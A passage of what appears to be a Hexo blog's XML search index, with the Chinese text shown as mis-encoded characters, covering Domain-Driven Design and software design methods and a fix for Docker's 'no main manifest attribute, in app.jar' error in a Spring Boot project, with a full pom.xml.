Servicesï¼‰ï¼š</strong><br>åº”ç”¨æœåŠ¡æ˜¯è½¯ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä»¬åè°ƒé¢†åŸŸå¯¹è±¡æ¥æ‰§è¡Œä»»åŠ¡ã€‚å®ƒä»¬è´Ÿè´£åº”ç”¨ç¨‹åºçš„å·¥ä½œæµç¨‹ï¼Œä½†ä¸åŒ…å«ä¸šåŠ¡è§„åˆ™æˆ–çŸ¥è¯†ã€‚</p></li><li><p><strong>åŸºç¡€è®¾æ–½ï¼ˆInfrastructureï¼‰ï¼š</strong><br>åŸºç¡€è®¾æ–½åŒ…æ‹¬ä¸ºé¢†åŸŸæ¨¡å‹æä¾›æŒä¹…åŒ–æœºåˆ¶ï¼ˆå¦‚æ•°æ®åº“ï¼‰ã€æ¶ˆæ¯ä¼ é€’ã€åº”ç”¨ç¨‹åºçš„é…ç½®ç­‰æŠ€æœ¯ç»„ä»¶ã€‚</p></li><li><p><strong>é¢†åŸŸäº‹ä»¶ï¼ˆDomain Eventsï¼‰ï¼š</strong><br>é¢†åŸŸäº‹ä»¶æ˜¯é¢†åŸŸä¸­å‘ç”Ÿçš„æœ‰æ„ä¹‰çš„ä¸šåŠ¡äº‹ä»¶ï¼Œå®ƒä»¬å¯ä»¥è§¦å‘å…¶ä»–å­ç³»ç»Ÿçš„ååº”æˆ–æµç¨‹ã€‚</p></li></ol><p>DDD çš„ç›®æ ‡æ˜¯é€šè¿‡å°†è½¯ä»¶çš„å…³æ³¨ç‚¹é›†ä¸­åœ¨<strong>æ ¸å¿ƒé¢†åŸŸ</strong>ä¸Šï¼Œå¹¶é€šè¿‡ä¸°å¯Œçš„é¢†åŸŸæ¨¡å‹æ¥ç®¡ç†å¤æ‚æ€§ï¼Œä»è€Œæé«˜è½¯ä»¶çš„<strong>è´¨é‡å’Œç»´æŠ¤æ€§</strong>ã€‚DDD å¼ºè°ƒä¸ä¸šåŠ¡ä¸“å®¶çš„ç´§å¯†åˆä½œï¼Œä»¥ç¡®ä¿è½¯ä»¶è§£å†³æ–¹æ¡ˆèƒ½å¤Ÿå‡†ç¡®åæ˜ <strong>ä¸šåŠ¡éœ€æ±‚</strong>ã€‚é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œè½¯ä»¶å¼€å‘å›¢é˜Ÿå¯ä»¥åˆ›å»ºå‡ºæ›´åŠ çµæ´»ã€å¯æ‰©å±•ä¸”ä¸ä¸šåŠ¡ç´§å¯†ç»“åˆçš„ç³»ç»Ÿã€‚</p><p>å…¶ä¸­DDDæ‰€æåˆ°çš„è½¯ä»¶è®¾è®¡æ–¹æ³•æ¶µç›–äº†ï¼šèŒƒå¼ã€æ¨¡å‹ã€æ¡†æ¶ã€æ–¹æ³•è®ºï¼Œä¸»è¦æ´»åŠ¨åŒ…æ‹¬å»ºæ¨¡ã€æµ‹è¯•ã€å·¥ç¨‹ã€å¼€å‘ã€éƒ¨ç½²ã€ç»´æŠ¤ã€‚</p><p>è½¯ä»¶è®¾è®¡æ–¹æ³•æ˜¯æŒ‡ä¸€ç³»åˆ—ç”¨äºæŒ‡å¯¼è½¯ä»¶å¼€å‘è¿‡ç¨‹çš„åŸåˆ™ã€æ¦‚å¿µå’Œå®è·µã€‚è¿™äº›æ–¹æ³•é€šå¸¸åŒ…æ‹¬èŒƒå¼ã€æ¨¡å‹ã€æ¡†æ¶å’Œæ–¹æ³•è®ºã€‚ä¸‹é¢æˆ‘å°†åˆ†åˆ«ä»‹ç»è¿™äº›æ¦‚å¿µä»¥åŠè½¯ä»¶è®¾è®¡çš„ä¸»è¦æ´»åŠ¨ã€‚</p><h4 id="èŒƒå¼-Paradigms"><a href="#èŒƒå¼-Paradigms" class="headerlink" title="èŒƒå¼ (Paradigms)"></a>èŒƒå¼ (Paradigms)</h4><p>èŒƒå¼æ˜¯æŒ‡è½¯ä»¶è®¾è®¡å’Œå¼€å‘çš„åŸºæœ¬é£æ ¼æˆ–å“²å­¦ã€‚å®ƒé€šå¸¸å®šä¹‰äº†ç¼–ç¨‹çš„åŸºæœ¬åŸåˆ™å’Œæ¨¡å¼ã€‚å¸¸è§çš„è½¯ä»¶è®¾è®¡èŒƒå¼åŒ…æ‹¬ï¼š</p><ul><li><strong>ç»“æ„åŒ–ç¼–ç¨‹</strong>ï¼šå¼ºè°ƒç¨‹åºç»“æ„çš„é‡è¦æ€§ï¼Œä½¿ç”¨é¡ºåºã€é€‰æ‹©å’Œå¾ªç¯æ§åˆ¶ç»“æ„ã€‚</li><li><strong>é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP)</strong>ï¼šåŸºäºå¯¹è±¡çš„æ¦‚å¿µï¼Œå°†æ•°æ®å’Œå¤„ç†æ•°æ®çš„æ–¹æ³•å°è£…åœ¨ä¸€èµ·ã€‚</li><li><strong>å‡½æ•°å¼ç¼–ç¨‹</strong>ï¼šå°†è®¡ç®—è§†ä¸ºæ•°å­¦å‡½æ•°çš„è¯„ä¼°ï¼Œé¿å…çŠ¶æ€æ”¹å˜å’Œå¯å˜æ•°æ®ã€‚</li><li><strong>äº‹ä»¶é©±åŠ¨ç¼–ç¨‹</strong>ï¼šä»¥äº‹ä»¶ä¸ºä¸­å¿ƒï¼Œå“åº”ç”¨æˆ·æ“ä½œã€æ¶ˆæ¯æˆ–å…¶ä»–ç³»ç»Ÿäº‹ä»¶ã€‚</li></ul><h4 id="æ¨¡å‹-Models"><a href="#æ¨¡å‹-Models" class="headerlink" title="æ¨¡å‹ (Models)"></a>æ¨¡å‹ (Models)</h4><p>æ¨¡å‹æ˜¯å¯¹è½¯ä»¶ç³»ç»Ÿçš„æŠ½è±¡è¡¨ç¤ºï¼Œç”¨äºå¸®åŠ©ç†è§£ã€è®¾è®¡å’Œæµ‹è¯•ç³»ç»Ÿã€‚å¸¸ç”¨çš„è½¯ä»¶è®¾è®¡æ¨¡å‹åŒ…æ‹¬ï¼š</p><ul><li><strong>UML (ç»Ÿä¸€å»ºæ¨¡è¯­è¨€)</strong>ï¼šä¸€å¥—å›¾å½¢åŒ–çš„å»ºæ¨¡è¯­è¨€ï¼Œç”¨äºæè¿°ã€è®¾è®¡å’Œæ–‡æ¡£åŒ–è½¯ä»¶é¡¹ç›®ã€‚</li><li><strong>ERæ¨¡å‹ (å®ä½“-å…³ç³»æ¨¡å‹)</strong>ï¼šç”¨äºæ•°æ®åº“è®¾è®¡ï¼Œæè¿°æ•°æ®çš„å®ä½“åŠå…¶ä¹‹é—´çš„å…³ç³»ã€‚</li><li><strong>çŠ¶æ€æœºæ¨¡å‹</strong>ï¼šæè¿°ç³»ç»Ÿå¯èƒ½çš„çŠ¶æ€ã€äº‹ä»¶å’Œåœ¨è¿™äº›äº‹ä»¶å‘ç”Ÿæ—¶çš„è½¬æ¢ã€‚</li></ul><h4 id="æ¡†æ¶-Frameworks"><a href="#æ¡†æ¶-Frameworks" class="headerlink" title="æ¡†æ¶ (Frameworks)"></a>æ¡†æ¶ (Frameworks)</h4><p>æ¡†æ¶æ˜¯ä¸€å¥—é¢„å…ˆåˆ¶å®šçš„ä»£ç åº“å’Œç»„ä»¶ï¼Œç”¨äºæä¾›è½¯ä»¶å¼€å‘çš„éª¨æ¶ã€‚æ¡†æ¶é€šå¸¸å®šä¹‰äº†åº”ç”¨ç¨‹åºçš„ç»“æ„ï¼Œæä¾›äº†ä¸€ç»„é€šç”¨çš„åŠŸèƒ½å’Œæ¨¡å¼ï¼Œä»¥ä¾¿å¼€å‘è€…å¯ä»¥ä¸“æ³¨äºå®ç°ç‰¹å®šçš„ä¸šåŠ¡é€»è¾‘ã€‚ä¾‹å¦‚ï¼š</p><ul><li><strong>Spring Framework</strong>ï¼šä¸€ä¸ªç”¨äºJavaåº”ç”¨ç¨‹åºçš„å…¨é¢ç¼–ç¨‹å’Œé…ç½®æ¨¡å‹ã€‚</li><li><strong>Ruby on Rails</strong>ï¼šä¸€ä¸ªç”¨äºå¿«é€Ÿå¼€å‘Webåº”ç”¨ç¨‹åºçš„Rubyæ¡†æ¶ã€‚</li><li><strong>Django</strong>ï¼šä¸€ä¸ªé«˜çº§Python Webæ¡†æ¶ï¼Œé¼“åŠ±å¿«é€Ÿå¼€å‘å’Œå¹²å‡€ã€å®ç”¨çš„è®¾è®¡ã€‚</li></ul><h4 id="æ–¹æ³•è®º-Methodologies"><a href="#æ–¹æ³•è®º-Methodologies" class="headerlink" title="æ–¹æ³•è®º (Methodologies)"></a>æ–¹æ³•è®º (Methodologies)</h4><p>æ–¹æ³•è®ºæ˜¯æŒ‡ä¸€å¥—æŒ‡å¯¼è½¯ä»¶å¼€å‘è¿‡ç¨‹çš„è§„åˆ™å’Œå®è·µã€‚å®ƒåŒ…æ‹¬é¡¹ç›®ç®¡ç†ã€å¼€å‘æµç¨‹ã€å›¢é˜Ÿåä½œç­‰æ–¹é¢ã€‚å¸¸è§çš„è½¯ä»¶å¼€å‘æ–¹æ³•è®ºæœ‰ï¼š</p><ul><li><strong>æ•æ·å¼€å‘</strong>ï¼šä¸€ç§è¿­ä»£å’Œå¢é‡çš„å¼€å‘æ–¹æ³•ï¼Œå¼ºè°ƒçµæ´»æ€§å’Œå®¢æˆ·åˆä½œã€‚</li><li><strong>Scrum</strong>ï¼šä¸€ç§æ•æ·å¼€å‘æ¡†æ¶ï¼Œç”¨äºç®¡ç†å¤æ‚çš„è½¯ä»¶å’Œäº§å“å¼€å‘ã€‚</li><li><strong>ç€‘å¸ƒæ¨¡å‹</strong>ï¼šä¸€ç§çº¿æ€§é¡ºåºçš„å¼€å‘æ–¹æ³•ï¼Œå°†é¡¹ç›®åˆ†ä¸ºä¸åŒé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µå®Œæˆåæ‰èƒ½è¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µã€‚</li></ul><h4 id="ä¸»è¦æ´»åŠ¨"><a href="#ä¸»è¦æ´»åŠ¨" class="headerlink" title="ä¸»è¦æ´»åŠ¨"></a>ä¸»è¦æ´»åŠ¨</h4><p>è½¯ä»¶è®¾è®¡çš„ä¸»è¦æ´»åŠ¨åŒ…æ‹¬ï¼š</p><ul><li><strong>å»ºæ¨¡ (Modeling)</strong> ï¼šé€šè¿‡åˆ›å»ºæ¨¡å‹æ¥è¡¨ç¤ºç³»ç»Ÿçš„ä¸åŒæ–¹é¢ï¼Œå¦‚ä½¿ç”¨UMLå›¾æ¥æè¿°ç³»ç»Ÿæ¶æ„ã€‚</li><li><strong>æµ‹è¯• (Testing)</strong> ï¼šç¡®ä¿è½¯ä»¶çš„è´¨é‡ï¼ŒåŒ…æ‹¬å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•ã€ç³»ç»Ÿæµ‹è¯•å’ŒéªŒæ”¶æµ‹è¯•ã€‚</li><li><strong>å·¥ç¨‹ (Engineering)</strong> ï¼šåº”ç”¨å·¥ç¨‹åŸåˆ™å’Œå®è·µæ¥æ„å»ºè½¯ä»¶ï¼ŒåŒ…æ‹¬éœ€æ±‚åˆ†æã€è®¾è®¡ã€å®ç°å’Œæµ‹è¯•ã€‚</li><li><strong>å¼€å‘ (Development)</strong> ï¼šç¼–å†™ä»£ç å’Œå®ç°åŠŸèƒ½ï¼Œå°†è®¾è®¡è½¬åŒ–ä¸ºå®é™…çš„è½¯ä»¶äº§å“ã€‚</li><li><strong>éƒ¨ç½² (Deployment)</strong> ï¼šå°†è½¯ä»¶å‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒï¼Œä½¿å…¶å¯ä¾›ç”¨æˆ·ä½¿ç”¨ã€‚</li><li><strong>ç»´æŠ¤ (Maintenance)</strong> ï¼šåœ¨è½¯ä»¶å‘å¸ƒåå¯¹å…¶è¿›è¡Œæ›´æ–°å’Œæ”¹è¿›ï¼Œä¿®å¤ç¼ºé™·ï¼Œæå‡æ€§èƒ½å’Œé€‚åº”æ€§ã€‚</li></ul><p>æ¯ä¸ªæ´»åŠ¨éƒ½æ˜¯è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒä»¬ç›¸äº’ä¾èµ–ï¼Œå…±åŒç¡®ä¿è½¯ä»¶é¡¹ç›®çš„æˆåŠŸã€‚</p><h4 id="ç»´æŠ¤-Maintenance"><a href="#ç»´æŠ¤-Maintenance" class="headerlink" title="ç»´æŠ¤ (Maintenance)"></a>ç»´æŠ¤ (Maintenance)</h4><p>è½¯ä»¶ç»´æŠ¤æ˜¯åœ¨è½¯ä»¶å‘å¸ƒåè¿›è¡Œçš„æ´»åŠ¨ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ul><li><strong>çº é”™</strong>ï¼šä¿®å¤è½¯ä»¶ä¸­å‘ç°çš„ç¼ºé™·æˆ–é”™è¯¯ã€‚</li><li><strong>é€‚åº”æ€§ç»´æŠ¤</strong>ï¼šä¿®æ”¹è½¯ä»¶ä»¥é€‚åº”ç¯å¢ƒçš„å˜åŒ–ï¼Œå¦‚æ“ä½œç³»ç»Ÿå‡çº§ã€ç¡¬ä»¶æ›´æ¢ç­‰ã€‚</li><li><strong>å®Œå–„æ€§ç»´æŠ¤</strong>ï¼šå¢åŠ æ–°åŠŸèƒ½æˆ–æå‡æ€§èƒ½ï¼Œä»¥æ»¡è¶³ç”¨æˆ·æ–°çš„æˆ–å˜åŒ–çš„éœ€æ±‚ã€‚</li><li><strong>é¢„é˜²æ€§ç»´æŠ¤</strong>ï¼šæ”¹è¿›è½¯ä»¶å†…éƒ¨ç»“æ„ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„é—®é¢˜å‘ç”Ÿï¼Œæé«˜è½¯ä»¶çš„å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚</li></ul><p>è½¯ä»¶ç»´æŠ¤æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œå®ƒç¡®ä¿è½¯ä»¶èƒ½å¤Ÿé•¿æœŸæœ‰æ•ˆåœ°æœåŠ¡äºç”¨æˆ·ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è½¯ä»¶è®¾è®¡æ–¹æ³•æ˜¯ä¸€ä¸ªå¤æ‚çš„é¢†åŸŸï¼Œæ¶‰åŠå¤šç§æ¦‚å¿µå’Œå®è·µã€‚èŒƒå¼æä¾›äº†è®¾è®¡å“²å­¦ï¼Œæ¨¡å‹å¸®åŠ©æˆ‘ä»¬ç†è§£å’ŒæŠ½è±¡ç³»ç»Ÿï¼Œæ¡†æ¶ä¸ºå¼€å‘æä¾›äº†åŸºç¡€ç»“æ„ï¼Œæ–¹æ³•è®ºæŒ‡å¯¼æ•´ä¸ªå¼€å‘è¿‡ç¨‹ã€‚è½¯ä»¶è®¾è®¡çš„ä¸»è¦æ´»åŠ¨â€”â€”å»ºæ¨¡ã€æµ‹è¯•ã€å·¥ç¨‹ã€å¼€å‘ã€éƒ¨ç½²å’Œç»´æŠ¤â€”â€”æ˜¯ç¡®ä¿è½¯ä»¶é¡¹ç›®æˆåŠŸçš„å…³é”®æ­¥éª¤ã€‚æ¯ä¸ªæ´»åŠ¨éƒ½éœ€è¦ä¸“ä¸šçŸ¥è¯†å’ŒæŠ€èƒ½ï¼Œä»¥åŠå¯¹åº”çš„å·¥å…·å’ŒæŠ€æœ¯çš„æ”¯æŒã€‚é€šè¿‡è¿™äº›æ´»åŠ¨çš„ååŒå·¥ä½œï¼Œè½¯ä»¶å·¥ç¨‹å¸ˆèƒ½å¤Ÿäº¤ä»˜é«˜è´¨é‡ã€æ»¡è¶³ç”¨æˆ·éœ€æ±‚çš„è½¯ä»¶äº§å“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³no main manifest attribute, in app.jar(Docker)</title>
      <link href="/2023/11/25/Docker(3)/"/>
      <url>/2023/11/25/Docker(3)/</url>
      
        <content type="html"><![CDATA[<h3 id="è§£å†³no-main-manifest-attribute-in-app-jar"><a href="#è§£å†³no-main-manifest-attribute-in-app-jar" class="headerlink" title="è§£å†³no main manifest attribute, in app.jar"></a>è§£å†³no main manifest attribute, in app.jar</h3><p><strong>ç¯å¢ƒ:SpringBoot2.6.13+java8</strong></p><ul><li><strong>é‡ç‚¹</strong>:pom.xmlæ–‡ä»¶æ˜¯IDEAè‡ªåŠ¨é…çš„</li></ul><p>æˆ‘åœ¨å°†ä¸€ä¸ªSpringBootç¨‹åºæ‰“åŒ…æˆé•œåƒéƒ¨ç½²åˆ°Dockerå®¹å™¨ä¸Š,ç„¶åæ‰§è¡Œrunå‘½ä»¤å¯åŠ¨å®¹å™¨:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm springboot-test:1.0</span><br></pre></td></tr></table></figure><p>springboot-test:1.0æ˜¯æˆ‘çš„é•œåƒ</p><p>å‡ºç°æŠ¥é”™:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no main manifest attribute, in app.jar</span><br></pre></td></tr></table></figure><br>æˆ‘æ’æŸ¥å‡ºæ¥é—®é¢˜å°±åœ¨pom.xmlæ–‡ä»¶ä¸­æˆ‘ç”»çº¢çº¿çš„è¿™ä¸€å¥<br><img src="https://pb01.s3.bitiful.net/30.png" alt="avatar"></p><p>æ”¹ä¸ºä¸‹é¢è¿™å¼ å›¾è¿™æ ·å°±å¥½äº†<br><img src="https://pb01.s3.bitiful.net/31.png" alt="avatar"></p><p>å®Œæ•´çš„pom.xmlæ–‡ä»¶å¦‚ä¸‹:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>DockerTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>DockerTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>DockerTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.6.13<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.example.dockertest.DockerTestApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">layout</span>&gt;</span>JAR<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªå®šä¹‰æ„å»ºDockeré•œåƒ</title>
      <link href="/2023/11/25/Docker(2)/"/>
      <url>/2023/11/25/Docker(2)/</url>
      
